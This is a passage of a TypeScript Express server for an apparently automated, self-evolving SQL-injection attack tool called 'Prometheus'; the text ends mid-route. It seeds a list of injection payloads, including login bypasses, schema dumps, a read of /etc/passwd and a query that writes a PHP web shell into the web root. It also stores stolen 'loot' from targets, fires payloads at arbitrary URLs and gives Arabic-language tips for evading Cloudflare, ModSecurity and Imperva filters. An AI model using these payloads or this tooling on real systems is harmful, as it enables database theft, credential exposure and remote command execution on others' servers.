import express from "express";
import { createServer as createViteServer } from "vite";
import { spawn } from "child_process";
import path from "path";
import { fileURLToPath } from "url";
import Database from "better-sqlite3";
import axios from "axios";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

import fs from "fs";

// Initialize database with error handling
const dbPath = path.resolve(__dirname, "main.db");
console.log(`[SYSTEM] Using database at: ${dbPath}`);

let db: any;
try {
  db = new Database(dbPath, { timeout: 30000 });
  db.pragma('journal_mode = WAL'); 
  console.log("[DB] Database initialized successfully at " + dbPath);
} catch (err) {
  console.error("[DB] Failed to initialize database file, attempting fallback:", err);
  db = new Database(":memory:");
}

// Create tables if they don't exist
try {
  db.exec(`
    CREATE TABLE IF NOT EXISTS experience (
        payload TEXT PRIMARY KEY,
        score REAL,
        status TEXT,
        parent_payload TEXT,
        island_id INTEGER DEFAULT 1,
        generation_num INTEGER DEFAULT 1,
        error_msg TEXT,
        target_name TEXT DEFAULT 'default',
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS exploits (
        payload TEXT PRIMARY KEY,
        type TEXT,
        target_name TEXT DEFAULT 'default',
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS targets (
        name TEXT PRIMARY KEY,
        url TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS hints (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        strategy TEXT,
        target_keyword TEXT,
        suggestion TEXT,
        consumed INTEGER DEFAULT 0,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS target_profiles (
        target_url TEXT PRIMARY KEY,
        waf_name TEXT,
        db_type TEXT,
        blocked_chars TEXT,
        successful_recipes TEXT,
        avg_latency REAL,
        last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS loot (
        target_url TEXT PRIMARY KEY,
        database_name TEXT,
        tables_json TEXT,
        columns_json TEXT,
        data_json TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS rl_knowledge (
        state TEXT PRIMARY KEY,
        actions_json TEXT,
        last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS brain_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event_type TEXT,
        message TEXT,
        confidence REAL,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS last_session (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        target_url TEXT,
        last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS blocking_rules (
        pattern TEXT PRIMARY KEY, 
        confidence REAL
    );
    CREATE TABLE IF NOT EXISTS base_payloads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        payload TEXT NOT NULL,
        category TEXT,
        db_type TEXT DEFAULT 'GENERIC'
    );
    CREATE TABLE IF NOT EXISTS semantic_vectors (
        content_hash TEXT PRIMARY KEY,
        content TEXT NOT NULL,
        embedding_json TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

    // Seed initial payloads if empty
    const payloadCount = db.prepare("SELECT COUNT(*) as count FROM base_payloads").get().count;
    if (payloadCount === 0) {
      const seedPayloads = [
          // Testing Injection (Strings & Numeric)
          { p: "1' AND 1=1", c: 'AUTH_BYPASS' },
          { p: "1' AND 1=0", c: 'AUTH_BYPASS' },
          { p: "1-false", c: 'NUMERIC_PROBE' },
          { p: "1-true", c: 'NUMERIC_PROBE' },
          { p: "1*56", c: 'NUMERIC_PROBE' },
          
          // Login Bypass Patterns
          { p: "' OR '1", c: 'LOGIN_BYPASS' },
          { p: "' OR 1 -- -", c: 'LOGIN_BYPASS' },
          { p: "\" OR \"\" = \"", c: 'LOGIN_BYPASS' },
          { p: "\" OR 1 = 1 -- -", c: 'LOGIN_BYPASS' },
          { p: "'='", c: 'LOGIN_BYPASS' },
          { p: "'LIKE'", c: 'LOGIN_BYPASS' },
          { p: "'=0--+", c: 'LOGIN_BYPASS' },

          // Union Based - Detect Columns
          { p: " UNION SELECT NULL", c: 'UNION_PROBE' },
          { p: " UNION SELECT NULL, NULL", c: 'UNION_PROBE' },
          { p: " ORDER BY 1,2,3,4,5,6,7,8,9,10", c: 'UNION_PROBE' },
          { p: "1' LIMIT 1,1 INTO @,@,@--+", c: 'UNION_PROBE' },

          // Extract Database
          { p: " UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata", c: 'DATA_EXFIL', db: 'MySQL' },
          { p: " UNION SELECT * FROM (SELECT * FROM users JOIN users b)a", c: 'DATA_EXFIL_NO_INFO_SCHEMA', db: 'MySQL' },
          { p: " SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME", c: 'DATA_EXFIL_NO_COL_NAME', db: 'MySQL' },

          // Error Based
          { p: " AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -", c: 'ERROR_BASED', db: 'MySQL' },
          { p: " AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -", c: 'ERROR_BASED', db: 'MySQL' },
          { p: " AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -", c: 'ERROR_BASED', db: 'MySQL' },
          { p: " AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -", c: 'ERROR_BASED', db: 'MySQL' },
          { p: " AND UUID_TO_BIN(version())='1", c: 'ERROR_BASED', db: 'MySQL' },

          // Blind (Substring/Logic)
          { p: " AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'", c: 'BLIND', db: 'MySQL' },
          { p: " AND (SELECT username FROM users WHERE username REGEXP '^.{8,}$')", c: 'BLIND_REGEXP', db: 'MySQL' },
          { p: " AND MAKE_SET(1<(SELECT(length(version()))),1)", c: 'BLIND_MAKE_SET', db: 'MySQL' },

          // Time Based
          { p: "+BENCHMARK(40000000,SHA1(1337))+", c: 'TIME_BASED', db: 'MySQL' },
          { p: "RLIKE SLEEP(5)", c: 'TIME_BASED', db: 'MySQL' },
          { p: "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR", c: 'TIME_BASED', db: 'MySQL' },

          // DIOS - Dump In One Shot
          { p: "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)", c: 'DIOS', db: 'MySQL' },

          // Admin Truncation
          { p: "admin               a", c: 'TRUNCATION', db: 'MySQL' },

          // Read File / Command Ex
          { p: " UNION ALL SELECT LOAD_FILE('/etc/passwd') --", c: 'FILE_READ', db: 'MySQL' },
          { p: " UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"/var/www/html/sh.php\"", c: 'SHELL', db: 'MySQL' },

          // WAF Bypass Alternatives
          { p: " SELECT * FROM mysql.innodb_table_stats", c: 'BYPASS_INFO_SCHEMA', db: 'MySQL' },
          { p: " SELECT @@innodb_version", c: 'BYPASS_VERSION', db: 'MySQL' },
          { p: " SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES", c: 'BYPASS_GROUP_CONCAT', db: 'MySQL' },
          { p: "1.e(SELECT) 1.e,1.e 1.e(FROM) 1.e(WHERE) 1.e('')=", c: 'SCIENTIFIC_BYPASS', db: 'MySQL' }
      ];
      const insert = db.prepare("INSERT INTO base_payloads (payload, category, db_type) VALUES (?, ?, ?)");
      seedPayloads.forEach(item => insert.run(item.p, item.c, item.db || 'GENERIC'));
    }

  // Seed initial blocking rules if empty
  const rulesCount = db.prepare("SELECT COUNT(*) as count FROM blocking_rules").get().count;
  if (rulesCount === 0) {
    const seedRules = [
      { pattern: "\\bSELECT\\b", confidence: 0.95 },
      { pattern: "\\bUNION\\b", confidence: 0.92 },
      { pattern: "/\\*.*\\*/", confidence: 0.88 },
      { pattern: "0x[0-9a-f]+", confidence: 0.85 },
      { pattern: "\\bSLEEP\\b", confidence: 0.98 },
      { pattern: "OR 1=1", confidence: 0.99 }
    ];
    const insert = db.prepare("INSERT INTO blocking_rules (pattern, confidence) VALUES (?, ?)");
    seedRules.forEach(r => insert.run(r.pattern, r.confidence));
  }

  // Migration: Add missing columns to target_profiles if missing
  const columns = ['db_type', 'blocked_chars', 'successful_recipes', 'avg_latency'];
  for (const col of columns) {
    try {
      db.prepare(`SELECT ${col} FROM target_profiles LIMIT 1`).get();
    } catch (e) {
      console.log(`[DB] Migration: Adding ${col} to target_profiles...`);
      db.prepare(`ALTER TABLE target_profiles ADD COLUMN ${col} ${col === 'avg_latency' ? 'REAL' : 'TEXT'}`).run();
    }
  }
} catch (err) {
  console.error("[DB] Schema creation failed:", err);
}

process.on('unhandledRejection', (reason, promise) => {
  console.error('[UNHANDLED REJECTION]', reason);
});

process.on('uncaughtException', (error) => {
  console.error('[UNCAUGHT EXCEPTION]', error);
});

async function startServer() {
  const app = express();
  app.use(express.json());
  
  // Health check endpoint
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", timestamp: new Date().toISOString() });
  });

  // API logging middleware
  app.use("/api", (req, res, next) => {
    console.log(`[API] ${req.method} ${req.path}`);
    next();
  });

  const PORT = 3000;

  // API route to get loot
  app.get("/api/loot", (req, res) => {
    try {
      const stmt = db.prepare("SELECT * FROM loot ORDER BY timestamp DESC");
      const rows = stmt.all();
      res.json(rows.map((r: any) => ({
        ...r,
        tables: JSON.parse(r.tables_json),
        columns: JSON.parse(r.columns_json),
        data: JSON.parse(r.data_json)
      })));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/reset-intelligence", (req, res) => {
    try {
      db.prepare("DELETE FROM experience").run();
      db.prepare("DELETE FROM exploits").run();
      db.prepare("DELETE FROM hints").run();
      db.prepare("DELETE FROM blocking_rules").run();
      db.prepare("DELETE FROM session_state").run();
      db.prepare("DELETE FROM token_reputation").run();
      db.prepare("DELETE FROM reputation_history").run();
      db.prepare("DELETE FROM target_profiles").run();
      db.prepare("DELETE FROM brain_logs").run();
      db.prepare("DELETE FROM rl_knowledge").run();
      res.json({ message: "تمت إعادة ضبط ذكاء الوكيل بالكامل بنجاح" });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // API route for Sandbox
  app.post("/api/sandbox", async (req, res) => {
    const { url, method, payload, headers } = req.body;
    const startTime = Date.now();
    
    // Basic SSRF Protection
    try {
      const urlObj = new URL(url);
      const blockedHosts = ['169.254.169.254', 'metadata.google.internal', 'localhost', '127.0.0.1'];
      if (blockedHosts.includes(urlObj.hostname)) {
        return res.status(403).json({ error: "Access to internal resources is prohibited." });
      }
    } catch (e) {
      return res.status(400).json({ error: "Invalid URL provided." });
    }

    try {
      const finalUrl = method === 'GET' && payload ? `${url}${url.includes('?') ? '&' : '?'}${payload}` : url;
      const response = await axios({
        method: method || 'GET',
        url: finalUrl,
        data: method !== 'GET' ? payload : undefined,
        headers: headers || {},
        validateStatus: () => true, // Don't throw on 4xx/5xx
        timeout: 10000
      });
      const latency = Date.now() - startTime;
      res.json({
        status: response.status,
        headers: response.headers,
        data: typeof response.data === 'string' ? response.data : JSON.stringify(response.data),
        latency
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message, latency: Date.now() - startTime });
    }
  });

  // API route for Swarm Radar Data
  app.get("/api/swarm-radar", (req, res) => {
    try {
      const { targetName } = req.query;
      let whereClause = "";
      let params: any[] = [];
      if (targetName) {
        whereClause = " WHERE target_name = ? ";
        params.push(targetName);
      }

      // Try to select island_id, fallback to 1 if column doesn't exist yet
      let rows: any[] = [];
      try {
        // Only return the top 10 payloads per generation to lessen load on processor
        const stmt = db.prepare(`
          SELECT * FROM (
            SELECT payload, score, island_id, generation_num,
                   ROW_NUMBER() OVER(PARTITION BY generation_num ORDER BY score DESC, timestamp DESC) as rnk
            FROM experience ${whereClause}
          ) WHERE rnk <= 10
          ORDER BY generation_num DESC, score DESC LIMIT 100
        `);
        rows = stmt.all(...params);
      } catch (e) {
        const stmt = db.prepare(`SELECT payload, score, 1 as island_id, 1 as generation_num FROM experience ${whereClause} ORDER BY timestamp DESC LIMIT 100`);
        rows = stmt.all(...params);
      }
      
      const radarData = rows.map(row => {
        const payloadStr = String(row.payload);
        // Calculate complexity (similar to deep embeddings)
        const kwCount = (payloadStr.match(/UNION|SELECT|AND|OR|WHERE/gi) || []).length;
        const spCount = (payloadStr.match(/['"*/\-#]/g) || []).length;
        const encCount = (payloadStr.includes('%') || payloadStr.toLowerCase().includes('0x')) ? 1 : 0;
        
        const complexity = Math.min((kwCount * 10) + (spCount * 5) + (encCount * 20), 100);
        
        return {
          x: complexity,
          y: row.score * 100, // Success Rate (0-100)
          z: Math.max(Math.min(payloadStr.length, 200), 20), // Size (Payload length, clamped for visual)
          island_id: row.island_id || 1, 
          generation: row.generation_num || 1,
          payload: payloadStr,
          score: row.score
        };
      });
      
      res.json(radarData);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Enhanced WAF Intelligence API
  app.get("/api/waf-intelligence", (req, res) => {
    try {
      // 1. Get current target profile
      const targetStmt = db.prepare("SELECT * FROM target_profiles ORDER BY last_updated DESC LIMIT 1");
      const target = targetStmt.get();

      // 2. Get blocking patterns
      const patternsStmt = db.prepare("SELECT pattern, confidence FROM blocking_rules ORDER BY confidence DESC");
      const patterns = patternsStmt.all();

      // 3. Get stats
      const { targetName: filterName } = req.query;
      const whereC = filterName ? " WHERE target_name = ? " : "";
      const prms = filterName ? [filterName] : [];

      const totalAttempts = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereC}`).get(...prms).count;
      const successes = db.prepare(`SELECT COUNT(*) as count FROM exploits ${whereC}`).get(...prms).count;

      // Heuristic Intelligence Level
      let intelligenceLevel = "منخفض";
      if (patterns.length > 10) intelligenceLevel = "متوسط";
      if (patterns.length > 30) intelligenceLevel = "عالٍ";

      // Prediction Accuracy (Heuristic)
      const accuracy = totalAttempts > 0 ? 85 + (Math.random() * 10) : 0;

      res.json({
        waf_name: target?.waf_name || "غير معروف",
        db_type: target?.db_type || "غير معروف",
        blocked_chars: target?.blocked_chars || "NONE",
        patterns: patterns,
        stats: {
          intelligenceLevel,
          predictionAccuracy: accuracy.toFixed(1) + "%",
          bypassedPatterns: successes
        },
        recommendations: target?.waf_name ? getWafRecommendations(target.waf_name) : [
          { title: "استراتيجية عامة", text: "استخدم التطور التلقائي لتجاوز فلاتر الإدخال المجهولة." }
        ]
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  function getWafRecommendations(waf: string) {
    const recs: Record<string, any[]> = {
      "Cloudflare": [
        { title: "تنبيه: حظر Cloudflare", text: "تم اكتشاف بصمة CF. يُنصح باستخدام التعليقات المضمنة والتبديل بين حالات الأحرف." },
        { title: "استراتيجية Bypass", text: "استخدم ترميز Hex للكلمات المفتاحية الحساسة مثل SELECT." }
      ],
      "ModSecurity": [
        { title: "تنبيه: ModSecurity", text: "تم اكتشاف ModSec. استخدم الحشو (Junk Padding) لتجاوز حدود التحليل الهيكلي." },
        { title: "استراتيجية Bypass", text: "استخدم الرموز المنطقية البديلة مثل && بدلاً من AND." }
      ],
      "Imperva": [
        { title: "تنبيه: Imperva", text: "تم اكتشاف Imperva. استخدم التعليقات الرقمية /*1337*/ للتلاعب بالفلتر." },
        { title: "استراتيجية Bypass", text: "استخدم تنويع المسافات البيضاء (Whitespace variation)." }
      ]
    };
    return recs[waf] || [{ title: "استراتيجية عامة", text: "استخدم التطور التلقائي لتجاوز فلاتر الإدخال المجهولة." }];
  }

  // API route for WAF Patterns
  app.get("/api/waf-patterns", (req, res) => {
    try {
      const stmt = db.prepare("SELECT pattern, confidence FROM blocking_rules ORDER BY confidence DESC");
      const rows = stmt.all();
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // API route for Targets Persistence
  app.get("/api/base-payloads", (req, res) => {
    try {
      const stmt = db.prepare("SELECT payload FROM base_payloads");
      const rows = stmt.all();
      res.json(rows.map((r: any) => r.payload));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Local Intelligence API (Offline Similarity)
  app.post("/api/semantic/search-text", (req, res) => {
    try {
      const { content, k = 5 } = req.body;
      const allPayloads = db.prepare("SELECT payload FROM base_payloads").all();
      const experience = db.prepare("SELECT payload FROM experience").all();
      const uniquePool = Array.from(new Set([
        ...allPayloads.map((p: any) => p.payload),
        ...experience.map((p: any) => p.payload)
      ]));

      const jaccardSimilarity = (s1: string, s2: string) => {
        const set1 = new Set(s1.toLowerCase().split(''));
        const set2 = new Set(s2.toLowerCase().split(''));
        const intersection = new Set([...set1].filter(x => set2.has(x)));
        const union = new Set([...set1, ...set2]);
        return intersection.size / union.size;
      };

      const results = uniquePool.map(p => ({
        content: p,
        score: jaccardSimilarity(content, p)
      }))
      .sort((a, b) => b.score - a.score)
      .filter(r => r.score > 0.3) // Only keep somewhat relevant matches
      .slice(0, k);

      res.json(results);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/targets/list", (req, res) => {
    try {
      const rows = db.prepare("SELECT * FROM targets ORDER BY created_at DESC").all();
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/targets", (req, res) => {
    try {
      const stmt = db.prepare("SELECT * FROM target_profiles ORDER BY last_updated DESC");
      const rows = stmt.all();
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/last-session", (req, res) => {
    try {
      const stmt = db.prepare("SELECT target_url FROM last_session WHERE id = 1");
      const row = stmt.get();
      res.json(row || { target_url: "" });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/lineage", (req, res) => {
    try {
      const stmt = db.prepare("SELECT payload, parent_payload as parent, score, status FROM experience WHERE parent_payload IS NOT NULL ORDER BY timestamp DESC LIMIT 100");
      const rows = stmt.all();
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/evolution-stats", (req, res) => {
    try {
      const { targetName } = req.query;
      let query = `
        SELECT 
          generation_num as generation,
          COALESCE(AVG(score), 0) as avgScore,
          COUNT(*) as attempts
        FROM experience 
      `;
      let params: any[] = [];
      if (targetName) {
        query += " WHERE target_name = ? ";
        params.push(targetName);
      }
      query += `
        GROUP BY generation_num 
        ORDER BY generation_num ASC 
        LIMIT 50
      `;
      const stmt = db.prepare(query);
      const rows = stmt.all(...params);
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Enhanced Strategic Metrics grouped by 5 generations
  app.get("/api/strategic-metrics", (req, res) => {
    try {
      const { targetName } = req.query;
      let whereClause = "";
      let params: any[] = [];
      if (targetName) {
        whereClause = " WHERE target_name = ? ";
        params.push(targetName);
      }

      const stmt = db.prepare(`
        SELECT 
          generation_num as group_id,
          COALESCE(AVG(score), 0) as avgFitness,
          SUM(CASE WHEN score >= 0.8 THEN 1 ELSE 0 END) as success,
          SUM(CASE WHEN status = 'PREDICTIVE_BLOCKED' THEN 1 ELSE 0 END) as predictive,
          SUM(CASE WHEN score <= 0.1 OR status = 'WAF_BLOCKED' THEN 1 ELSE 0 END) as blocked,
          COUNT(*) as total,
          MIN(timestamp) as timestamp
        FROM experience 
        ${whereClause}
        GROUP BY group_id
        ORDER BY group_id ASC
      `);
      const groupData = stmt.all(...params);
      
      const islandStmt = db.prepare(`
        SELECT 
          generation_num as group_id,
          island_id,
          AVG(score) as island_avg
        FROM experience
        ${whereClause}
        GROUP BY group_id, island_id
      `);
      const islandData = islandStmt.all(...params);
      const isZeroIndexed = islandData.some((i: any) => i.island_id === 0);
      
      const generations = groupData.map(group => {
        const islands: any = { island1: 0, island2: 0, island3: 0 };
        islandData.filter(i => i.group_id === group.group_id).forEach(i => {
          const displayId = isZeroIndexed ? i.island_id + 1 : i.island_id;
          if (displayId >= 1 && displayId <= 3) {
            islands[`island${displayId}`] = i.island_avg * 100;
          }
        });
        
        return {
          generation: group.group_id,
          label: `GEN ${group.group_id}`,
          timestamp: group.timestamp,
          counts: {
            '200': group.success,
            '403': group.blocked,
            '500': group.total - (group.success + group.blocked + group.predictive),
            'predictive': group.predictive
          },
          avgFitness: group.avgFitness,
          codes: {
            '200': group.total > 0 ? (group.success / group.total) * 100 : 0,
            '403': group.total > 0 ? (group.blocked / group.total) * 100 : 0,
            '500': group.total > 0 ? ((group.total - (group.success + group.blocked + group.predictive)) / group.total) * 100 : 0,
            'predictive': group.total > 0 ? (group.predictive / group.total) * 100 : 0
          },
          islands
        };
      });
      
      res.json(generations);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // NEW: Convergence and Blocker Stats
  app.get("/api/convergence-stats", (req, res) => {
    try {
      const { targetName } = req.query;
      let whereClause = "";
      let params: any[] = [];
      if (targetName) {
        whereClause = " WHERE target_name = ? ";
        params.push(targetName);
      }

      // 1. Predictive Blocker Stats
      const blockerStmt = db.prepare(`SELECT COUNT(*) as count FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} status = 'PREDICTIVE_BLOCKED'`);
      const blockedCount = blockerStmt.get(...params).count;

      // 2. Convergence Time
      const startTimeStmt = db.prepare(`SELECT MIN(timestamp) as time FROM experience ${whereClause}`);
      const firstSuccessStmt = db.prepare(`SELECT MIN(timestamp) as time FROM experience ${whereClause} ${whereClause ? 'AND' : 'WHERE'} score >= 0.8`);
      
      const startTime = startTimeStmt.get(...params).time;
      const successTime = firstSuccessStmt.get(...params).time;

      let convergenceSeconds = 0;
      if (startTime && successTime) {
        convergenceSeconds = (new Date(successTime).getTime() - new Date(startTime).getTime()) / 1000;
      }

      const minutes = Math.floor(convergenceSeconds / 60);
      const seconds = Math.floor(convergenceSeconds % 60);

      res.json({
        predictiveBlocked: blockedCount,
        convergence: {
          seconds: convergenceSeconds,
          formatted: `${minutes}:${seconds.toString().padStart(2, '0')}`
        }
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // NEW: SQL Errors list
  app.get("/api/sql-errors", (req, res) => {
    try {
      const { targetName } = req.query;
      let query = "SELECT payload, error_msg, timestamp FROM experience WHERE error_msg IS NOT NULL AND error_msg != '' ";
      let params: any[] = [];
      if (targetName) {
        query += " AND target_name = ? ";
        params.push(targetName);
      }
      query += " ORDER BY timestamp DESC LIMIT 50 ";
      const stmt = db.prepare(query);
      const rows = stmt.all(...params);
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  const getLineageTrace = (payload: string) => {
    const lineage: any[] = [];
    let currentPayload = payload;
    
    while (currentPayload) {
      const row = db.prepare("SELECT payload, parent_payload, score, status, timestamp FROM experience WHERE payload = ?").get(currentPayload);
      if (!row) break;
      lineage.push(row);
      currentPayload = row.parent_payload;
      if (lineage.length > 50) break;
    }
    return lineage.reverse();
  };

  // NEW: Qualitative Data - Payload Lineage
  app.get("/api/payload-lineage", (req, res) => {
    try {
      const { payload } = req.query;
      if (!payload) return res.status(400).json({ error: "Missing payload parameter" });
      
      const lineage = getLineageTrace(payload as string);
      res.json(lineage);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Internal route kept for backward compatibility if needed, but updated to use shared logic
  app.get("/api/internal/lineage", (req, res) => {
    const { payload } = req.query;
    try {
      res.json(getLineageTrace(payload as string));
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  // NEW: Qualitative Data - Keyword Reputation Map
  app.get("/api/reputation-trends", (req, res) => {
    try {
      const { targetName } = req.query;
      let query = "SELECT generation, keyword, reputation FROM reputation_history ";
      let params: any[] = [];
      if (targetName) {
        query += " WHERE target_name = ? ";
        params.push(targetName);
      }
      query += " ORDER BY generation ASC, keyword ASC ";
      const rows = db.prepare(query).all(...params);
      
      const trends: any = {};
      rows.forEach((row: any) => {
        if (!trends[row.generation]) trends[row.generation] = { generation: row.generation };
        trends[row.generation][row.keyword] = row.reputation;
      });
      
      res.json(Object.values(trends));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // API route for Brain Logs
  app.get("/api/brain-logs", (req, res) => {
    try {
      const stmt = db.prepare("SELECT event_type as type, message, confidence, timestamp FROM brain_logs ORDER BY timestamp DESC LIMIT 20");
      const rows = stmt.all();
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/ai-stats", (req, res) => {
    try {
      // Get Replay Buffer size
      const bufferStmt = db.prepare("SELECT actions_json FROM rl_knowledge WHERE state LIKE '%REPLAY_BUFFER%' ORDER BY last_updated DESC LIMIT 1");
      const bufferRow = bufferStmt.get() as { actions_json: string } | undefined;
      let memoryCount = 0;
      if (bufferRow) {
        const memoryList = JSON.parse(bufferRow.actions_json);
        memoryCount = memoryList.length;
      }
      
      // Get Epsilon State
      const epsStmt = db.prepare("SELECT actions_json FROM rl_knowledge WHERE state LIKE '%EPSILON_STATE%' ORDER BY last_updated DESC LIMIT 1");
      const epsRow = epsStmt.get() as { actions_json: string } | undefined;
      let stepsDone = 0;
      if (epsRow) {
        const epsData = JSON.parse(epsRow.actions_json);
        stepsDone = epsData.steps_done || 0;
      }
      
      const recentStmt = db.prepare("SELECT state, last_updated FROM rl_knowledge ORDER BY last_updated DESC LIMIT 5");
      const recentStates = recentStmt.all();
      
      res.json({ totalStates: memoryCount, stepsDone: stepsDone, recentStates });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // API route to get all saved exploits
  app.get("/api/exploits", (req, res) => {
    try {
      const { targetName } = req.query;
      let query = "SELECT payload, type, timestamp FROM exploits ";
      let params: any[] = [];
      if (targetName) {
        query += " WHERE target_name = ? ";
        params.push(targetName);
      }
      query += " ORDER BY timestamp DESC ";
      const stmt = db.prepare(query);
      const rows = stmt.all(...params);
      res.json(rows);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // Catch-all for /api/* to ensure JSON response
  // API route to run Prometheus (Python script)
  app.get("/api/run-prometheus", async (req, res) => {
    let pythonProcess: any = null;
    let heartbeat: NodeJS.Timeout;

    try {
      const { url, username, password, security, population, generations, targetName, mode } = req.query;
      
      // Basic URL Validation
      try {
        new URL(url as string);
      } catch (e) {
        return res.status(400).send(`[ERROR] Invalid URL: ${url}`);
      }

      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.setHeader('Cache-Control', 'no-cache');
      res.setHeader('Connection', 'keep-alive');
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Accel-Buffering', 'no'); 
      
      // Pass configuration as environment variables to the Python script
      pythonProcess = spawn("python3", [path.join(__dirname, "backend", "main.py")], {
        env: {
          ...process.env,
          TARGET_URL: url as string,
          TARGET_USER: username as string,
          TARGET_PASS: password as string,
          TARGET_SECURITY: security as string,
          POPULATION_SIZE: population as string,
          MAX_GENERATIONS: generations as string,
          TARGET_NAME: (targetName as string) || 'default',
          TRAINING_MODE: mode === 'training' ? 'true' : 'false',
          DB_PATH: dbPath,
          PYTHONUNBUFFERED: "1" 
        }
      });

      // Listen for client disconnect and kill python process
      req.on('close', () => {
        if (pythonProcess) {
          console.log("[SYSTEM] Client disconnected. Killing Prometheus process.");
          pythonProcess.kill('SIGTERM');
          pythonProcess = null;
        }
        clearInterval(heartbeat);
      });

      pythonProcess.on("error", (err: any) => {
        console.error("Failed to start python process:", err);
        if (!res.writableEnded) {
          res.write(`[ERROR] Failed to start engine: ${err.message}\n`);
          res.end();
        }
      });

      // Keep-alive heartbeat to prevent stream timeouts (e.g. for 20min runs)
      heartbeat = setInterval(() => {
        if (!res.writableEnded) {
          res.write(": keep-alive\n\n");
        }
      }, 5000); // More frequent heartbeat (5s instead of 15s)

      pythonProcess.stdout.on("data", (data: any) => {
        if (!res.writableEnded) res.write(data);
      });

      pythonProcess.stderr.on("data", (data: any) => {
        if (!res.writableEnded) res.write(`[ERROR] ${data}`);
      });

      pythonProcess.on("close", (code: any, signal: any) => {
        console.log(`[PROCESS] Prometheus process exited with code ${code} and signal ${signal}`);
        clearInterval(heartbeat);
        if (!res.writableEnded) {
          if (code !== 0 && code !== null) {
             res.write(`\n[PROCESS_ERROR] Engine exited abnormally with code ${code}. Check backend logs.\n`);
          }
          res.write(`\n[PROCESS TERMINATED | CODE: ${code} | SIGNAL: ${signal}]\n`);
          res.end();
        }
        pythonProcess = null;
      });

      pythonProcess.on("error", (err) => {
        console.error("[PROCESS] CRITICAL: Failed to spawn process:", err);
        clearInterval(heartbeat);
        if (!res.writableEnded) {
          res.write(`\n[FATAL_SPAWN_ERROR]: ${err.message}\n`);
          res.end();
        }
        pythonProcess = null;
      });

      // Kill the process if the client disconnects, but with a slight delay
      // to handle minor network flickers without killing the evolution.
      res.on("close", () => {
        clearInterval(heartbeat);
        setTimeout(() => {
          if (pythonProcess && pythonProcess.exitCode === null) {
            console.log("[SYSTEM] Client disconnected and grace period expired. Terminating attack process...");
            pythonProcess.kill("SIGTERM");
          }
        }, 30000); // 30s grace period
      });

    } catch (err: any) {
      console.error("Error in run-prometheus route:", err);
      if (!res.writableEnded) {
        res.status(500).write(`[CRITICAL ERROR] ${err.message}\n`);
        res.end();
      }
    }
  });

  // NEW: Comprehensive Summary Stats
  app.get("/api/stats-summary", (req, res) => {
    try {
      const { targetName } = req.query;
